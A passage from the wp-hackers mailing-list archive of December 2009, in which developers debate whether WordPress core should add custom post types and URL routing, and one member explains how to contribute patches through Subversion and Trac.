enhance it's core, while leaving the leanness that people expect.

On 2009-12-02, at 6:44 PM, Mike Schinkel wrote:

> On Dec 2, 2009, at 5:22 PM, Adam Taylor wrote:
>> On Wed, Dec 2, 2009 at 10:16 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net>wrote:
>>>
>>> I have absolutely no jealousy here; I'm a pragmatic entrepreneur  
>>> who knows
>>> how to program.  I want a business solution, not to follow an  
>>> ideology.
>>>
>>
>> Why don't you "embrace open source", fork Wordpress, and shape it  
>> how you
>> like.  If others agree with your idea/philosophy they will support  
>> it by
>> using it, and Wordpress can stick to being an awesome blogging  
>> platform.
>
> Because I see that #1 value of WordPress being it's large user base  
> and large support for that user base.  Forking would be killing the  
> goose that lays the golden eggs in that respect.  I would *never*  
> fork a successful open source project.  I would instead try to  
> influence it within.
>
> For the record there are almost certainly better technical solutions  
> than WordPress but the inertia behind WordPress make all those  
> technical benefits moot.
>
> -Mike Schinkel
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mgerring at emrl.com  Wed Dec  2 22:55:36 2009
From: mgerring at emrl.com (Matthew Gerring)
Date: Wed, 2 Dec 2009 14:55:36 -0800
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <862d087f0912021437p66cb280ag9a403f8bbd4e27bd@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<862d087f0912021437p66cb280ag9a403f8bbd4e27bd@mail.gmail.com>
Message-ID: <D286A2D4-93BF-4184-8B28-4A7CEE209B2C@emrl.com>

I don't really understand what all the fuss is about. The shop I work  
for has been using WordPress as a CMS for all of our clients for  
something like two years, covering a lot of different use cases-  
everything from basic informational sites to public records  
repositories to online stores.

Between Pods and More Fields, you already have working custom post  
types. 2.9's support for them will only enhance what's already there,  
not really create any new functionality. And URL routing has never  
really been an issue for us.

As far as "perception", I'm not sure where the problem is there,  
either. 100% of our clients have never heard of WordPress, and they  
don't care, either- they just like it because the interface is dead  
simple, and it works. The perception issue, if there is such an issue,  
is better solved by just doing quality work for clients needing an  
easy-to-use CMS solution than going around trying to convince people  
that you can do such a thing.

Anyway. Just my two cents. I personally think 2.9 rocks as is, and I  
can't wait to start using it in production.


On Dec 2, 2009, at 2:37 PM, Nathan Rice wrote:

> I think the principles that will make WordPress a better general use  
> CMS are
> the same principles that will make it a good blogging platform.
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice
>
>
> On Wed, Dec 2, 2009 at 5:22 PM, Otto <otto at ottodestruct.com> wrote:
>
>> On Wed, Dec 2, 2009 at 4:16 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net> wrote:
>>> ... support for custom post types and custom URL routing ...
>>
>> You're overly focused on these two aspects. Neither myself nor Jared
>> said anything about specifics.
>>
>>> Again, that's a strawman. Talk specifics, not platitudes.
>>
>> This thread was not intended to be about specifics. I was speaking in
>> general terms and talking about general directions. If you want to
>> talk about specific things, talk about them, but not as responses to
>> unrelated materials. Then things just get confusing.
>>
>> For the record, I think custom post types are a good thing.
>>
>> I don't like your particular visions about URL routing, because I
>> think you're thinking too narrowly and focusing on your specific  
>> needs
>> instead of having a wider scope, but I'm not generically opposed to
>> making URLs easier to work with.
>>
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From harish.mlists at gmail.com  Wed Dec  2 22:58:51 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 02 Dec 2009 22:58:51 +0000
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
 read...)
In-Reply-To: <7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
Message-ID: <4B16F12B.9080209@gmail.com>

Mike Schinkel wrote:
> On Dec 2, 2009, at 5:22 PM, Adam Taylor wrote:
>> On Wed, Dec 2, 2009 at 10:16 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net>wrote:
>>> I have absolutely no jealousy here; I'm a pragmatic entrepreneur who knows
>>> how to program.  I want a business solution, not to follow an ideology.
>>>
>> Why don't you "embrace open source", fork Wordpress, and shape it how you
>> like.  If others agree with your idea/philosophy they will support it by
>> using it, and Wordpress can stick to being an awesome blogging platform.
> 
> Because I see that #1 value of WordPress being it's large user base and large support for that user base.  Forking would be killing the goose that lays the golden eggs in that respect.  I would *never* fork a successful open source project.  I would instead try to influence it within.

Therefore, please submit high quality patches to go along with your many
ideas. This is the most credible way to shape the direction of a
community project.

Harish

From mikeschinkel at newclarity.net  Wed Dec  2 22:59:15 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 17:59:15 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <D286A2D4-93BF-4184-8B28-4A7CEE209B2C@emrl.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<862d087f0912021437p66cb280ag9a403f8bbd4e27bd@mail.gmail.com>
	<D286A2D4-93BF-4184-8B28-4A7CEE209B2C@emrl.com>
Message-ID: <9C28BDEE-1E74-48E8-B1F6-657D266A03DD@newclarity.net>

On Dec 2, 2009, at 5:55 PM, Matthew Gerring wrote:
> And URL routing has never really been an issue for us.

Point of note: Not an issue for you but it's always been an issue for most of my use cases (which are rarely ever blogs.)

-Mike Schinkel


From scribu at gmail.com  Wed Dec  2 23:09:40 2009
From: scribu at gmail.com (scribu)
Date: Thu, 3 Dec 2009 01:09:40 +0200
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <4B16F12B.9080209@gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
Message-ID: <349fe48b0912021509i21d0423s30e8d61299b7d6f9@mail.gmail.com>

On Thu, Dec 3, 2009 at 12:58 AM, Harish Narayanan
<harish.mlists at gmail.com>wrote:

> > Because I see that #1 value of WordPress being it's large user base and
> large support for that user base.  Forking would be killing the goose that
> lays the golden eggs in that respect.  I would *never* fork a successful
> open source project.  I would instead try to influence it within.
>
> Therefore, please submit high quality patches to go along with your many
> ideas. This is the most credible way to shape the direction of a
> community project.
>
> Harish
>

'nough said.


-- 
http://scribu.net

From harish.mlists at gmail.com  Wed Dec  2 23:31:51 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 02 Dec 2009 23:31:51 +0000
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
 read...)
In-Reply-To: <0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
Message-ID: <4B16F8E7.4080608@gmail.com>

(Pushing this back onto the list.)

Mike Schinkel wrote:
> Offlist: I'm not familiar with how to produce patches.
> Suggestions?

Yes, in short, this is what you do:

 1. Fetch the development version of WordPress from subversion.
 2. Make all the changes you want. Try to do this in small stages,
    tackling one problem at a time.
 3. Create a patch: svn diff > my-contribution.diff
 4. Create a suitable entry in WordPress trac and attach your patch to
    the entry.
 5. If you feel your patch is being ignored, bring it up in the mailing
    list and people will likely have a look at it.

For more instructions, please read the following page:
http://codex.wordpress.org/Using_Subversion#Developer.27s_commands

> 
> -Mike
> P.S. One of the problems with producing patches is they get ignored.  It's better to have agreement in advance before wasting time writing code that will never be used.

Perhaps so (which is why I gave you a step 5 above). But this is not
very likely if they are high-quality, useful and a lot of people tend to
like them.

All I was trying to say is the following. Rather than discussing ideas
repeatedly with people who disagree with you, show them why your
approach is better by providing a working implementation.

Show people how:

 1. Things things can be made more general with respect to URI structure
 2. WordPress can be moved more easily between domains if it had some
    added functionality
 3. They would benefit from rock-solid Twitter support in the WordPress
    core.
 4. Easy it is to maximise performance by minimising HTTP requests and
    concatenating things into a single CSS file.
 5. They would benefit from geotagging.
 6. Evil global-like variables are.

 ... and a multitude of other things.

None of these are bad ideas. Many of these are good ideas, and perhaps
they haven't been implemented because someone just hasn't done it.
Please try and help out.

It is usually easier to see something tangible than to discuss it in the
abstract.

Happy hacking,
Harish

From jmiloj at gmail.com  Wed Dec  2 23:36:11 2009
From: jmiloj at gmail.com (Jerry Johnson)
Date: Wed, 2 Dec 2009 18:36:11 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <4B16F8E7.4080608@gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
	<4B16F8E7.4080608@gmail.com>
Message-ID: <a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>

Harish, thanks for that explanation.

I now have a goal for the new year.

On Wed, Dec 2, 2009 at 6:31 PM, Harish Narayanan <harish.mlists at gmail.com>wrote:

> (Pushing this back onto the list.)
>
> Mike Schinkel wrote:
> > Offlist: I'm not familiar with how to produce patches.
> > Suggestions?
>
> Yes, in short, this is what you do:
>

From mikeschinkel at newclarity.net  Wed Dec  2 23:39:20 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 18:39:20 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <4B16F8E7.4080608@gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
	<4B16F8E7.4080608@gmail.com>
Message-ID: <7EB82817-CD2D-4E23-9D17-6BB56C43370F@newclarity.net>

Harish,

It's extremely poor form to reply to email sent to you privately back onto a mailing list regardless if the content of the email was benign.

If you'd have preferred to only reply to the list you should have responded privately with that concern rather than just publicly respond to a private email.

-Mike

On Dec 2, 2009, at 6:31 PM, Harish Narayanan wrote:

> (Pushing this back onto the list.)
> 
> Mike Schinkel wrote:
>> Offlist: I'm not familiar with how to produce patches.
>> Suggestions?
> 
> Yes, in short, this is what you do:
> 
> 1. Fetch the development version of WordPress from subversion.
> 2. Make all the changes you want. Try to do this in small stages,
>    tackling one problem at a time.
> 3. Create a patch: svn diff > my-contribution.diff
> 4. Create a suitable entry in WordPress trac and attach your patch to
>    the entry.
> 5. If you feel your patch is being ignored, bring it up in the mailing
>    list and people will likely have a look at it.
> 
> For more instructions, please read the following page:
> http://codex.wordpress.org/Using_Subversion#Developer.27s_commands
> 
>> 
>> -Mike
>> P.S. One of the problems with producing patches is they get ignored.  It's better to have agreement in advance before wasting time writing code that will never be used.
> 
> Perhaps so (which is why I gave you a step 5 above). But this is not
> very likely if they are high-quality, useful and a lot of people tend to
> like them.
> 
> All I was trying to say is the following. Rather than discussing ideas
> repeatedly with people who disagree with you, show them why your
> approach is better by providing a working implementation.
> 
> Show people how:
> 
> 1. Things things can be made more general with respect to URI structure
> 2. WordPress can be moved more easily between domains if it had some
>    added functionality
> 3. They would benefit from rock-solid Twitter support in the WordPress
>    core.
> 4. Easy it is to maximise performance by minimising HTTP requests and
>    concatenating things into a single CSS file.
> 5. They would benefit from geotagging.
> 6. Evil global-like variables are.
> 
> ... and a multitude of other things.
> 
> None of these are bad ideas. Many of these are good ideas, and perhaps
> they haven't been implemented because someone just hasn't done it.
> Please try and help out.
> 
> It is usually easier to see something tangible than to discuss it in the
> abstract.
> 
> Happy hacking,
> Harish


From harish.mlists at gmail.com  Wed Dec  2 23:41:31 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Wed, 02 Dec 2009 23:41:31 +0000
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
 read...)
In-Reply-To: <7EB82817-CD2D-4E23-9D17-6BB56C43370F@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>	<4B16F12B.9080209@gmail.com>	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>	<4B16F8E7.4080608@gmail.com>
	<7EB82817-CD2D-4E23-9D17-6BB56C43370F@newclarity.net>
Message-ID: <4B16FB2B.5060504@gmail.com>

Mike Schinkel wrote:
> Harish,
> 
> It's extremely poor form to reply to email sent to you privately back onto a mailing list regardless if the content of the email was benign.
> 
> If you'd have preferred to only reply to the list you should have responded privately with that concern rather than just publicly respond to a private email.

(Like I tried to say:)

I didn't mean to be rude. I felt the instructions might benefit someone
else who's curious on how to help develop WordPress.

I apologise for offending you.

Harish

From jaredbangs at gmail.com  Wed Dec  2 23:42:18 2009
From: jaredbangs at gmail.com (Jared Bangs)
Date: Wed, 2 Dec 2009 15:42:18 -0800
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
Message-ID: <7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>

On Wed, Dec 2, 2009 at 2:49 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> On Dec 2, 2009, at 5:42 PM, Jerry Johnson wrote:
>> I am all for keeping wordpress small, fast and tight. Because it rocks that
>> way. I can bloat it fine on my own.
>
> There's a belief held by many that adding features necessarily affects performance negatively. That is not by any means a rule and to make decisions based on only that assumption does a disservice to the broader community. ?Having the option of custom post types and the option of URL routing should not negatively affect those sites that do not use those options if the enhancements are architected with performance in mind.
>
> -Mike Schinkel
>

"Fast" is only one of the things he mentioned, and not one that I was
really addressing at all in my concerns. A primary reason to keep any
software project as small and as focused as possible is complexity.
The more code you write, the more features you add, etc. the more
difficult it can become to maintain in the future, which then leads to
more bugs, security issues, etc.

Like Einstein said, "everything should be as simple as possible, but
no simpler".

If you believe (as I do) that "WordPress is not, and should not be,
all things to all people" (to quote Otto's first message in this
thread), then it's better to identify up front what it should be, and
vigilantly guard against scope creep that introduces complexity in an
effort to exceed those boundaries.

If on the other hand, you think that WordPress is (or should become)
the ideal solution for every possible web project (a position I think
is clearly wrong and cannot relate to), then it would make sense that
the scope of the core WP project would need to be (or become) enormous
in order to accommodate that.

In the past, the core devs have strongly supported the position of
keeping the focus on what WordPress is designed to do. I think the
more clearly defined "what it's designed to do" is (and thus the more
constrained the scope) the easier it will be for WordPress to
accomplish that goal and do it well.

This thread isn't about particular features, it's about a mindset.
Specifically, one that sees a problem or project and says "how can I
handle this... with WordPress" rather than just "what's the best way
to handle this". It's my opinion that the former approach is overly
narrow, and CAN lead to the advocating of unnecessary core features in
order to support it.

From ncrice at gmail.com  Wed Dec  2 23:44:51 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 2 Dec 2009 18:44:51 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
	<4B16F8E7.4080608@gmail.com>
	<a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>
Message-ID: <862d087f0912021544k680448c4lb6134de8dc0c2d9f@mail.gmail.com>

Yeah, it's one thing to have a working patch just waiting to be approved ...
it's another thing to have a vision for the software, but want other people
to write the code to make your (or my) vision a reality. I've been guilty of
the latter far too many times. (but I'm not necessarily saying that you're
guilty of this, Mike)

Generally, those who produce the code get to decide what does, and does not,
become a part of WP core. It's probably better that way, too, in most cases.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice


On Wed, Dec 2, 2009 at 6:36 PM, Jerry Johnson <jmiloj at gmail.com> wrote:

> Harish, thanks for that explanation.
>
> I now have a goal for the new year.
>
> On Wed, Dec 2, 2009 at 6:31 PM, Harish Narayanan <harish.mlists at gmail.com
> >wrote:
>
> > (Pushing this back onto the list.)
> >
> > Mike Schinkel wrote:
> > > Offlist: I'm not familiar with how to produce patches.
> > > Suggestions?
> >
> > Yes, in short, this is what you do:
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Wed Dec  2 23:50:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 18:50:53 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <862d087f0912021544k680448c4lb6134de8dc0c2d9f@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
	<4B16F8E7.4080608@gmail.com>
	<a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>
	<862d087f0912021544k680448c4lb6134de8dc0c2d9f@mail.gmail.com>
Message-ID: <572437C4-F700-4CC4-8DF8-6BE74E90544C@newclarity.net>

On Dec 2, 2009, at 6:44 PM, Nathan Rice wrote:
> Yeah, it's one thing to have a working patch just waiting to be approved ...
> it's another thing to have a vision for the software, but want other people
> to write the code to make your (or my) vision a reality. I've been guilty of
> the latter far too many times. (but I'm not necessarily saying that you're
> guilty of this, Mike)

I'd be happy to write code, if I knew it would be accepted.  

I unfortunately can't afford the time to write code that will never be used (I wish I did have the time because I enjoy writing code, but life keeps getting in the way.) 

> Generally, those who produce the code get to decide what does, and does not,
> become a part of WP core. It's probably better that way, too, in most cases.

I'd argue it's not those who produce code but those who have commit rights.  The latter get to decide.

-Mike Schinkel

From ncrice at gmail.com  Wed Dec  2 23:57:50 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Wed, 2 Dec 2009 18:57:50 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <572437C4-F700-4CC4-8DF8-6BE74E90544C@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>
	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>
	<4B16F12B.9080209@gmail.com>
	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>
	<4B16F8E7.4080608@gmail.com>
	<a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>
	<862d087f0912021544k680448c4lb6134de8dc0c2d9f@mail.gmail.com>
	<572437C4-F700-4CC4-8DF8-6BE74E90544C@newclarity.net>
Message-ID: <862d087f0912021557y493eb5cev5408384850854fa6@mail.gmail.com>

On Wed, Dec 2, 2009 at 6:50 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

>
> I'd be happy to write code, if I knew it would be accepted.
>
> I unfortunately can't afford the time to write code that will never be used
> (I wish I did have the time because I enjoy writing code, but life keeps
> getting in the way.)
>

That is the one risk of doing it that way. Writing code can take a while,
and it would feel like a waste of time if it wasn't accepted.


>
> I'd argue it's not those who produce code but those who have commit rights.
>  The latter get to decide.
>
>
True, but the people who have commit rights:
1. got those rights because they wrote patches, even some that probably
never got into core
2. feel much better about accepting patches into core if the patch actually
gets written :-)

I understand your frustration, though. You'd rather get support for a
particular feature before you waste time writing the code. Unfortunately, in
open source (and the WP community), things aren't generally done that way.
The only exception would be ideas that get debated in the weekly IRC chats.
But I've personally never seen an idea get debated on wp-hackers and
eventually make it into core. This simply hasn't been the venue in which the
WP power brokers look for ideas to include in core.

Hopefully that helps.

Nathan

From harish.mlists at gmail.com  Thu Dec  3 00:04:33 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Thu, 03 Dec 2009 00:04:33 +0000
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
 read...)
In-Reply-To: <862d087f0912021557y493eb5cev5408384850854fa6@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>	<d0cdc35c0912021422x26790d5dod4ac36334a8e1bcf@mail.gmail.com>	<7B463F87-D484-4C3F-8303-862AFF13EBA7@newclarity.net>	<4B16F12B.9080209@gmail.com>	<0B4C1B7A-2CCE-4BF2-9268-11A09AE737E8@newclarity.net>	<4B16F8E7.4080608@gmail.com>	<a1fff2b20912021536q75dce083yb5be62a67347e684@mail.gmail.com>	<862d087f0912021544k680448c4lb6134de8dc0c2d9f@mail.gmail.com>	<572437C4-F700-4CC4-8DF8-6BE74E90544C@newclarity.net>
	<862d087f0912021557y493eb5cev5408384850854fa6@mail.gmail.com>
Message-ID: <4B170091.7040202@gmail.com>

Nathan Rice wrote:
> On Wed, Dec 2, 2009 at 6:50 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>> I'd be happy to write code, if I knew it would be accepted.
>>
>> I unfortunately can't afford the time to write code that will never be used
>> (I wish I did have the time because I enjoy writing code, but life keeps
>> getting in the way.)
>>
> 
> That is the one risk of doing it that way. Writing code can take a while,
> and it would feel like a waste of time if it wasn't accepted.

Except, of course, it usually isn't a waste of time because you wrote
the code in the first place because it worked (on whatever level) for you!

>> I'd argue it's not those who produce code but those who have commit rights.
>>  The latter get to decide.
>>
>>
> True, but the people who have commit rights:
> 1. got those rights because they wrote patches, even some that probably
> never got into core
> 2. feel much better about accepting patches into core if the patch actually
> gets written :-)

Exactly!

Harish

From mikeschinkel at newclarity.net  Thu Dec  3 00:11:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 2 Dec 2009 19:11:03 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
Message-ID: <8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>

On Dec 2, 2009, at 6:42 PM, Jared Bangs wrote:
> If you believe (as I do) that "WordPress is not, and should not be,
> all things to all people" (to quote Otto's first message in this
> thread), then it's better to identify up front what it should be...


So what would that be?

Personally I like what's on WordPress.org:

WordPress is a state-of-the-art publishing platform with a focus on aesthetics, web standards, and usability. WordPress is both free and priceless at the same time.

Is that not correct?  Does anyone feel that should be changed?

Based on that, I'd argue that custom post types and custom URLs are a must have for a "state-of-the-art publishing platform."  Is there a valid argument against that?

Would I think WordPress is a good platform to build a new SAAS offering?  Not so much.

> This thread isn't about particular features, it's about a mindset.
> Specifically, one that sees a problem or project and says "how can I
> handle this... with WordPress" rather than just "what's the best way
> to handle this". It's my opinion that the former approach is overly
> narrow, and CAN lead to the advocating of unnecessary core features in
> order to support it.

I'd propose another question: "Is there a solid reason WordPress cannot handle this?"  

WordPress brings along far more benefits than any other proposed alternative. Using something else leaves the user without those many benefits which to me is not a smart solution.

On Dec 2, 2009, at 7:04 PM, Harish Narayanan wrote:
>> That is the one risk of doing it that way. Writing code can take a while,
>> and it would feel like a waste of time if it wasn't accepted.
> 
> Except, of course, it usually isn't a waste of time because you wrote
> the code in the first place because it worked (on whatever level) for you!


Point of note if the modification is to the core and it's not accepted it is a waste of time because no one in their right mind should deploy a modified version of the core if those mods are not going to get rolled into the core.  So it's only not a waste of time if the mods are in plugin or theme form.

On Dec 2, 2009, at 6:57 PM, Nathan Rice wrote:
> I understand your frustration, though. You'd rather get support for a
> particular feature before you waste time writing the code. Unfortunately, in
> open source (and the WP community), things aren't generally done that way.
> The only exception would be ideas that get debated in the weekly IRC chats.
> But I've personally never seen an idea get debated on wp-hackers and
> eventually make it into core. This simply hasn't been the venue in which the
> WP power brokers look for ideas to include in core.
> 
> Hopefully that helps.

Thanks, I appreciate it.  Yes it is frustrating. I'm an entrepreneur looking for viable solutions and the open source approach doesn't always support getting there efficiently, unfortunately.  Thanks for understanding.

-Mike Schinkel

From malaiac at gmail.com  Thu Dec  3 00:24:46 2009
From: malaiac at gmail.com (Malaiac)
Date: Thu, 3 Dec 2009 01:24:46 +0100
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
	<8BB3FFC0-8A50-46DC-B9D1-F2F349585221@newclarity.net>
Message-ID: <59e7f3130912021624p3a6ec115mf0d01add86aa410c@mail.gmail.com>

My 2 cents in poor english.
Having encountered many cases where WP was the solution fit to the
needs of my clients, I often regret the lack of management (or, more
precisely, WP getting in the way of what I need to achieve) of custom
content types and poor rewriting.

I don't think handling custom content types and the URLs that go along
would "bloat" the WP core. The way they are coded are actually very
restrictive to "post" content, and they could be rewrited in a more
generic way ; post management would then be a specific use of these
fonctions.

M

From harish.mlists at gmail.com  Thu Dec  3 00:28:37 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Thu, 03 Dec 2009 00:28:37 +0000
